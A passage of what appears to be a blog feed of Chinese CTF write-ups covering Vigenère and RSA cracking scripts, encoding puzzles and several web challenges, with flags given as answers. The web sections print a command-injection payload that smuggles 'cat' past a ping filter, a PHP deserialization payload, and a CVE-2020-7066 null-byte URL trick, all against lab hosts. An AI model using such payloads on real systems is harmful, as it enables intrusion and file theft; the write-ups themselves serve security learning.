class="line"><span class="number">0.0202124</span>, <span class="number">0.0564513</span>, <span class="number">0.0596302</span>,</span><br><span class="line"><span class="number">0.0137645</span>, <span class="number">0.0008606</span>, <span class="number">0.0497563</span>,</span><br><span class="line"><span class="number">0.0515760</span>, <span class="number">0.0729357</span>, <span class="number">0.0225134</span>,</span><br><span class="line"><span class="number">0.0082903</span>, <span class="number">0.0171272</span>, <span class="number">0.0013692</span>,</span><br><span class="line"><span class="number">0.0145984</span>, <span class="number">0.0007836</span></span><br><span class="line">]       <span class="comment"># 英文字符频率。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cipher = <span class="built_in">input</span>(<span class="string">&#x27;请输入维吉尼亚密文：&#x27;</span>)</span><br><span class="line">cipher_alpha = c_alpha(cipher)</span><br><span class="line">print(<span class="string">u&quot;猜测的秘钥长度为:&quot;</span>)</span><br><span class="line">pre_10(cipher)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 猜测单个秘钥得到的重合指数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">count_CI2</span>(<span class="params">cipher,n</span>):</span>     <span class="comment"># n 代表我们猜测的秘钥，也即偏移量</span></span><br><span class="line">    N = [<span class="number">0.0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>)]</span><br><span class="line">    cipher = c_alpha(cipher)</span><br><span class="line">    L = <span class="built_in">len</span>(cipher)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(L):     <span class="comment">#计算所有字母的频数，存在数组N当中</span></span><br><span class="line">        <span class="keyword">if</span> (cipher[i].islower()):</span><br><span class="line">            N[(<span class="built_in">ord</span>(cipher[i]) - <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) - n)%<span class="number">26</span>] += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            N[(<span class="built_in">ord</span>(cipher[i]) - <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) - n)%<span class="number">26</span>] += <span class="number">1</span></span><br><span class="line">    CI_2 = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">        CI_2 += ((N[i] / L) * F[i])</span><br><span class="line">    <span class="keyword">return</span> CI_2</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">one_key</span>(<span class="params">cipher,key_len</span>):</span></span><br><span class="line">    un_cip = [<span class="string">&#x27;&#x27;</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(key_len)]</span><br><span class="line">    cipher_alpha = c_alpha(cipher)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cipher_alpha)):     <span class="comment"># 完成分组工作</span></span><br><span class="line">        z = i % key_len</span><br><span class="line">        un_cip[z] += cipher_alpha[i]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(key_len):</span><br><span class="line">        <span class="built_in">print</span> (i)</span><br><span class="line">        pre_5_key(un_cip[i])     <span class="comment">####这里应该将5个分组的秘钥猜测全部打印出来</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 找出前5个最可能的单个秘钥</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pre_5_key</span>(<span class="params">cipher</span>):</span></span><br><span class="line">    M = [(<span class="number">0</span>,<span class="number">0.0</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">        M[i] = (<span class="built_in">chr</span>(<span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)+i),<span class="built_in">abs</span>(<span class="number">0.065</span> - count_CI2(cipher,i)))</span><br><span class="line">    M = <span class="built_in">sorted</span>(M,key = <span class="keyword">lambda</span> x:x[<span class="number">1</span>])   <span class="comment">#按照数组第二个元素排序</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        <span class="built_in">print</span> (M[i])</span><br><span class="line"></span><br><span class="line">key_len = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;请输入猜测的密钥长度：&#x27;</span>))   <span class="comment">#输入猜测的秘钥长度</span></span><br><span class="line">one_key(cipher,key_len)</span><br></pre></td></tr></table></figure><p>最后可以得到<strong>密钥长度为6，密钥为catbin</strong></p><h3 id="childRSA"><a href="#childRSA" class="headerlink" title="childRSA"></a>childRSA</h3><h4 id="考点：RSA小指数e爆破"><a href="#考点：RSA小指数e爆破" class="headerlink" title="考点：RSA小指数e爆破"></a>考点：RSA小指数e爆破</h4><p>提示：</p><blockquote><p>v先生有一边听广播一边码字的坏习惯。为了保证coding工作的正确性，v先生今天把数据多算了几遍</p></blockquote><p>题目给了我们一个算法，和三组数据，其中我们知道了<strong>e=3，三组c&amp;n</strong></p><p>这个e是小的，直接反应到小指数爆破</p><blockquote><p>当e=3时，如果明文过小，导致明文的三次方仍然小于n，那么通过直接对密文三次开方，即可得到明文</p><p>原理：加密为c=m^e mod n    解密为m=c^d mod n</p><p>分析：如果e过小（m^e&lt;n或者m^e&lt;2<em>n） 就可以直接对c开方。 m^e=k</em>n+c</p></blockquote><p>所以直接脚本爆破</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, long_to_bytes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">M_ = bytes_to_long(<span class="built_in">bytes</span>(flag, encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">Cipher = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    rsa = RSA.generate(<span class="number">1024</span>, e=<span class="number">3</span>)</span><br><span class="line">    print(<span class="string">&quot;n&#123;&#125; = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(i+<span class="number">1</span>,<span class="built_in">hex</span>(rsa.n)))</span><br><span class="line">    C_ = (<span class="built_in">pow</span>(M_,rsa.e,rsa.n))  <span class="comment"># m e n</span></span><br><span class="line">    print(<span class="string">&quot;c&#123;&#125; = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(i+<span class="number">1</span>, <span class="built_in">hex</span>(C_)))</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020“学长杯”-WP</title>
      <link href="2020/11/05/2020%E2%80%9C%E5%AD%A6%E9%95%BF%E6%9D%AF%E2%80%9D/"/>
      <url>2020/11/05/2020%E2%80%9C%E5%AD%A6%E9%95%BF%E6%9D%AF%E2%80%9D/</url>
      
        <content type="html"><![CDATA[<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="签个到"><a href="#签个到" class="headerlink" title="签个到"></a>签个到</h3><p>没什么好说的，先看一下网页源代码，好像不能用F12，那就用这个</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:网页</span><br></pre></td></tr></table></figure><p>就可以看到flag了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wzctf&#123;d0_y0u_1ike_rush_b&#125;</span><br></pre></td></tr></table></figure><h3 id="吃豆人大挑战"><a href="#吃豆人大挑战" class="headerlink" title="吃豆人大挑战"></a>吃豆人大挑战</h3><h4 id="考点：简单的抓包"><a href="#考点：简单的抓包" class="headerlink" title="考点：简单的抓包"></a>考点：简单的抓包</h4><p>我们开启抓包工具进行抓包，按照题目要求，我们积分必须<strong>超过2000分才会出flag</strong></p><p>在了解完题目意思后，我觉得页面一定有传回的包携带着我们的积分，我们只要去找到并且修改就好了，所以找到页面与服务器的交流数据包就是关键了</p><p>尝试时发现，在生命值用完之前，页面是不会发送数据包的，页面只会将最后的总积分发送给服务器。所以，我们直接抓到最后的包进行修改就好了</p><h3 id="开箱"><a href="#开箱" class="headerlink" title="开箱"></a>开箱</h3><p>开了几次就随机抽到flag了。。。</p><h3 id="cat"><a href="#cat" class="headerlink" title="cat"></a>cat</h3><p>看到源代码，需要我们提交变量cat和dog</p><ul><li>GET提交cat，内容为dog</li><li>GET提交dog，内容为cat</li></ul><h3 id="easy-unser"><a href="#easy-unser" class="headerlink" title="easy_unser"></a>easy_unser</h3><h4 id="考点：PHP反序列化漏洞"><a href="#考点：PHP反序列化漏洞" class="headerlink" title="考点：PHP反序列化漏洞"></a>考点：PHP反序列化漏洞</h4><p>我们先在网页源代码看到了==unserialize.php==这个地址，进入后是一段源代码</p><p>检查函数后发现这是一个<strong>PHP反序列化漏洞</strong>，我们构造payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.30.25.54:28030&#x2F;unserialize.php</span><br><span class="line"></span><br><span class="line">xixi&#x3D;O:4:&quot;Easy&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125; </span><br></pre></td></tr></table></figure><p><img src="https://antlers.oss-cn-hangzhou.aliyuncs.com/blog_images/CTF/2020%E6%B8%A9%E8%81%8C%E9%99%A2CTF_easy_unser.png" alt="CTF_easy_unser"></p><h3 id="easycode"><a href="#easycode" class="headerlink" title="easycode"></a>easycode</h3><p>查看源代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="variable">$value</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;value&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; count(<span class="variable">$value</span>); ++<span class="variable">$i</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$value</span>[<span class="variable">$i</span>] &gt; <span class="number">32</span> &amp;&amp; <span class="variable">$value</span>[<span class="variable">$i</span>] &lt; <span class="number">127</span>) <span class="keyword">unset</span>(<span class="variable">$value</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="variable">$username</span> .= chr(<span class="variable">$value</span>[<span class="variable">$i</span>]);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$username</span> == <span class="string">&#x27;w3lc0me_To_WZCTF2020&#x27;</span> &amp;&amp; intval(<span class="variable">$password</span>) &lt; <span class="number">2333</span> &amp;&amp; intval(<span class="variable">$password</span> + <span class="number">1</span>) &gt; <span class="number">2333</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>, <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>chr()会先除256取余，然后再转换成字符，所以我们传的ASCII码要加上256</p><h3 id="Ping一下"><a href="#Ping一下" class="headerlink" title="Ping一下"></a>Ping一下</h3><h4 id="考点：命令执行绕过"><a href="#考点：命令执行绕过" class="headerlink" title="考点：命令执行绕过"></a>考点：命令执行绕过</h4><p>我们首先看到网页源代码，发现过滤了很多东西</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> (<span class="string">&#x27;./page.html&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_POST</span>)) &#123;</span><br><span class="line">    header(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line">    <span class="variable">$ip</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$as</span> = <span class="string">&quot;/ \/|\~|\!|\@|\#|\%|\^|\&amp;|\*|\(|\)|\_|\+|\&#123;|\&#125;|\:|\&lt;|\&gt;|\?|\[|\]|\,|\/|\;|\&#x27;|\-|\=\| /&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="variable">$as</span>, <span class="variable">$ip</span>)) &#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Don&#x27;t hack me!!!!!&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">elseif</span> (preg_match(<span class="string">&quot;/\s/&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Don&#x27;t hack me!!!!!&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">elseif</span> (strstr(<span class="variable">$ip</span>,<span class="string">&quot;fl&quot;</span>))&#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Don&#x27;t hack me!!!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$a</span> = shell_exec(<span class="string">&quot;ping -c 4 &quot;</span> . <span class="variable">$ip</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line">    print_r(<span class="variable">$a</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125; Don<span class="string">&#x27;t hack me!!!!!</span></span><br></pre></td></tr></table></figure><p>用|隔断命令，最后构造出payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1|cat$IFS$9f\lag.php</span><br></pre></td></tr></table></figure><h3 id="cve-2020-7066"><a href="#cve-2020-7066" class="headerlink" title="cve-2020-7066"></a>cve-2020-7066</h3><h4 id="考点：cve-2020-7066漏洞"><a href="#考点：cve-2020-7066漏洞" class="headerlink" title="考点：cve-2020-7066漏洞"></a>考点：cve-2020-7066漏洞</h4><p>看到cve直接百度查找这个漏洞的相关记录</p><p>其实就是get_header()的CVE。这个函数特点就是会去请求url并返回header头部。<strong>但是CVE告诉我们，如果是用%00截断，就可能让命令去请求用户的可控网址。</strong></p><p>提示本地访问，那就直接127.0.0.1</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?url&#x3D;http:&#x2F;&#x2F;127.0.0.1%00www.example.php</span><br></pre></td></tr></table></figure><p><img src="https://antlers.oss-cn-hangzhou.aliyuncs.com/blog_images/CTF/2020%E6%B8%A9%E8%81%8C%E9%99%A2CTF_cve.png" alt="2020温职院CTF_cve.png"></p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="听个歌放松一下"><a href="#听个歌放松一下" class="headerlink" title="听个歌放松一下"></a>听个歌放松一下</h3><p>歌曲封面就有flag</p><h3 id="简单的流量"><a href="#简单的流量" class="headerlink" title="简单的流量"></a>简单的流量</h3><p>我们追踪一下TCP流，当流为5时我们看到的flag</p><p><img src="https://antlers.oss-cn-hangzhou.aliyuncs.com/blog_images/CTF/2020%E6%B8%A9%E8%81%8C%E9%99%A2CTF_%E7%AE%80%E5%8D%95%E7%9A%84%E6%B5%81%E9%87%8F.png" alt="简单的流量"></p><h3 id="爆破是门艺术"><a href="#爆破是门艺术" class="headerlink" title="爆破是门艺术"></a>爆破是门艺术</h3><p>我们解压后先看图片，这个里面给了密码提示（12位，开头是2020）</p><p><img src="https://antlers.oss-cn-hangzhou.aliyuncs.com/blog_images/CTF/2020%E6%B8%A9%E8%81%8C%E9%99%A2CTF_%E7%88%86%E7%A0%B4%E6%98%AF%E9%97%A8%E8%89%BA%E6%9C%AF_1.png" alt="爆破是门艺术"></p><p>直接爆破，设置好参数</p><p><img src="https://antlers.oss-cn-hangzhou.aliyuncs.com/blog_images/CTF/2020%E6%B8%A9%E8%81%8C%E9%99%A2CTF_%E7%88%86%E7%A0%B4%E6%98%AF%E9%97%A8%E8%89%BA%E6%9C%AF_2.png" alt="爆破是门艺术"></p><p>最后得到密码</p><p><img src="https://antlers.oss-cn-hangzhou.aliyuncs.com/blog_images/CTF/2020%E6%B8%A9%E8%81%8C%E9%99%A2CTF_%E7%88%86%E7%A0%B4%E6%98%AF%E9%97%A8%E8%89%BA%E6%9C%AF_3.png" alt="爆破是门艺术"></p><h3 id="闪电5连鞭"><a href="#闪电5连鞭" class="headerlink" title="闪电5连鞭"></a>闪电5连鞭</h3><p>看到题目，我啪的一下就打开了Stegsolve，很快啊，就一帧一帧看，就看到flag了</p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="你是文盲吗"><a href="#你是文盲吗" class="headerlink" title="你是文盲吗"></a>你是文盲吗</h3><p>题目如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">你能看懂啥？，这里会有答案吗？</span><br><span class="line">殟馽蘤鬠灏這殧襫噠韽蘤萿灏</span><br></pre></td></tr></table></figure><p>不用说，第一反应就是找到耳机，打开谷歌翻译，让谷歌读出来</p><p>拼音：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Wēn zhí huā kuò hào zhè jiù shì dá ān huā kuò hào</span><br></pre></td></tr></table></figure><p>flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wzctf&#123;zhe_jiu_shi_da_an&#125;</span><br></pre></td></tr></table></figure><h3 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h3><h4 id="考点：RSA"><a href="#考点：RSA" class="headerlink" title="考点：RSA"></a>考点：RSA</h4><p>是一道RSA的简单题</p><p>题目如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">公式一把梭</span><br><span class="line">n &#x3D; 33</span><br><span class="line">e &#x3D; 3</span><br><span class="line">解是26</span><br><span class="line"></span><br><span class="line">-------------------------</span><br><span class="line">答案是多少</span><br></pre></td></tr></table></figure><p>我们直接就可以口算出p、q的值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">p &#x3D; 3</span><br><span class="line">q &#x3D; 11</span><br><span class="line">e &#x3D; 3</span><br><span class="line"></span><br><span class="line">c &#x3D; 26</span><br></pre></td></tr></table></figure><p>没什么好说的，直接算出来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">e = <span class="number">3</span></span><br><span class="line">p = <span class="number">3</span></span><br><span class="line">q = <span class="number">11</span></span><br><span class="line">c = <span class="number">26</span></span><br><span class="line">n = p * q</span><br><span class="line"> </span><br><span class="line">phi = n - (p + q) + <span class="number">1</span></span><br><span class="line">d = <span class="built_in">int</span>(gmpy2.invert(e, phi))</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">print(m)</span><br><span class="line">print(long_to_bytes(m))</span><br><span class="line">// 最后计算出是<span class="number">5</span></span><br></pre></td></tr></table></figure><p>题目要求flag为md5小写加密，找个在线网站得：<code>e4da3b7fbbce2345d7772b0674a318d5</code></p><h3 id="lookdown"><a href="#lookdown" class="headerlink" title="lookdown"></a>lookdown</h3><p>题目如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">王德发？？这啥东西呀</span><br><span class="line">516b684b545341354f46564c54794257526b52594944517a5630525349465a4853453467555664545769424f534564574944633256456856</span><br></pre></td></tr></table></figure><p>16进制转字符串</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QkhKTSA5OFVLTyBWRkRYIDQzV0RSIFZHSE4gUVdTWiBOSEdWIDc2VEhV</span><br></pre></td></tr></table></figure><p>base64解密</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BHJM 98UKO VFDX 43WDR VGHN QWSZ NHGV 76THU</span><br></pre></td></tr></table></figure><p>不用说，一看就是键盘密码，ok解决</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">n i c e b a b y</span><br></pre></td></tr></table></figure><h3 id="层层深入"><a href="#层层深入" class="headerlink" title="层层深入"></a>层层深入</h3><h4 id="第一层"><a href="#第一层" class="headerlink" title="第一层"></a>第一层</h4><p><img src="https://antlers.oss-cn-hangzhou.aliyuncs.com/blog_images/CTF/2020%E6%B8%A9%E8%81%8C%E9%99%A2CTF_%E5%B1%82%E5%B1%82%E6%B7%B1%E5%85%A5_1.png" alt="层层深入"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wcewteotzflmoc&#x2F;&#x2F;栅栏密码 3栏</span><br><span class="line"></span><br><span class="line">welcometowzctf1.7z密码</span><br></pre></td></tr></table></figure><h4 id="第二层"><a href="#第二层" class="headerlink" title="第二层"></a>第二层</h4><p>图片名称提示维吉尼亚密码，压缩包提示key=super</p><p><img src="https://antlers.oss-cn-hangzhou.aliyuncs.com/blog_images/CTF/2020%E6%B8%A9%E8%81%8C%E9%99%A2CTF_%E5%B1%82%E5%B1%82%E6%B7%B1%E5%85%A5_2.png" alt="层层深入"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">aqprkligitggbievsdyrnmxrxwl&#x2F;&#x2F;维吉尼亚密码，key&#x3D;super</span><br><span class="line"></span><br><span class="line">iwanttorecommendyouavsinger3.rar密码</span><br></pre></td></tr></table></figure><h4 id="第三层"><a href="#第三层" class="headerlink" title="第三层"></a>第三层</h4><p><img src="https://antlers.oss-cn-hangzhou.aliyuncs.com/blog_images/CTF/2020%E6%B8%A9%E8%81%8C%E9%99%A2CTF_%E5%B1%82%E5%B1%82%E6%B7%B1%E5%85%A5_3.png" alt="层层深入"></p><p>这个就很明显了，摩尔斯密码。提示还有一个工具网站，待会要用到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.- ..--- ..-. --</span><br><span class="line"></span><br><span class="line">A2FM</span><br></pre></td></tr></table></figure><h4 id="第四层"><a href="#第四层" class="headerlink" title="第四层"></a>第四层</h4><p>这一层就比较难了，我们进入这个工具网站，这个网站是密码种类查询器，这种密码是<strong>Pokémon</strong>密码</p><p><img src="https://antlers.oss-cn-hangzhou.aliyuncs.com/blog_images/CTF/2020%E6%B8%A9%E8%81%8C%E9%99%A2CTF_%E5%B1%82%E5%B1%82%E6%B7%B1%E5%85%A5_4.png" alt="层层深入"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.dcode.fr&#x2F;</span><br></pre></td></tr></table></figure><p><img src="https://antlers.oss-cn-hangzhou.aliyuncs.com/blog_images/CTF/2020%E6%B8%A9%E8%81%8C%E9%99%A2CTF_%E5%B1%82%E5%B1%82%E6%B7%B1%E5%85%A5_5.png" alt="层层深入"></p><p>最后密码就是：<strong>suki</strong></p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="helloworld"><a href="#helloworld" class="headerlink" title="helloworld"></a>helloworld</h3><p>shift+F12查找字符串就可以看到flag了</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020杭电CTF-WP</title>
      <link href="2020/10/17/2020%E6%9D%AD%E7%94%B5CTF-NAK/"/>
      <url>2020/10/17/2020%E6%9D%AD%E7%94%B5CTF-NAK/</url>
      
        <content type="html"><![CDATA[<h1 id="又见面了"><a href="#又见面了" class="headerlink" title="又见面了"></a>又见面了</h1><p>看见后觉得是base64加密的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RlBJWkwlN0JTa2t6RXVhR21ncnQlN0QlMjBDbGFzc2ljYWwlMjBjcnlwdG8&#x3D;</span><br></pre></td></tr></table></figure><p>于是base64解码后得到，发现像URL编码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FPIZL%7BSkkzEuaGmgrt%7D%20Classical%20crypto</span><br></pre></td></tr></table></figure><p>进行url解码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FPIZL&#123;SkkzEuaGmgrt&#125; Classical crypto</span><br></pre></td></tr></table></figure><p>再进行凯撒解码，找到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZJCTF&#123;MeetYouAgaln&#125; Wfummcwuf wlsjni</span><br></pre></td></tr></table></figure><h1 id="尺蠖求伸"><a href="#尺蠖求伸" class="headerlink" title="尺蠖求伸"></a>尺蠖求伸</h1><p>得到文件后，IDA打开，查找字符串后找到flag</p><p><img src="https://antlers.oss-cn-hangzhou.aliyuncs.com/blog_images/CTF/2020%E6%9D%AD%E7%94%B5CTF%20%282%29.png" alt="2020杭电CTF (2)"></p><p>进入后查看伪代码</p><p><img src="https://antlers.oss-cn-hangzhou.aliyuncs.com/blog_images/CTF/2020%E6%9D%AD%E7%94%B5CTF%20%281%29.png" alt="2020杭电CTF (1)"></p><p>flag被base64加密了，于是进行解密，得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZJCTF&#123;rE_15_H4rD_8U7_U5EfuL&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Typhoon-湖湘杯2020-WP</title>
      <link href="2020/10/10/2020%E6%B9%96%E6%B9%98%E6%9D%AF-WP/"/>
      <url>2020/10/10/2020%E6%B9%96%E6%B9%98%E6%9D%AF-WP/</url>
      
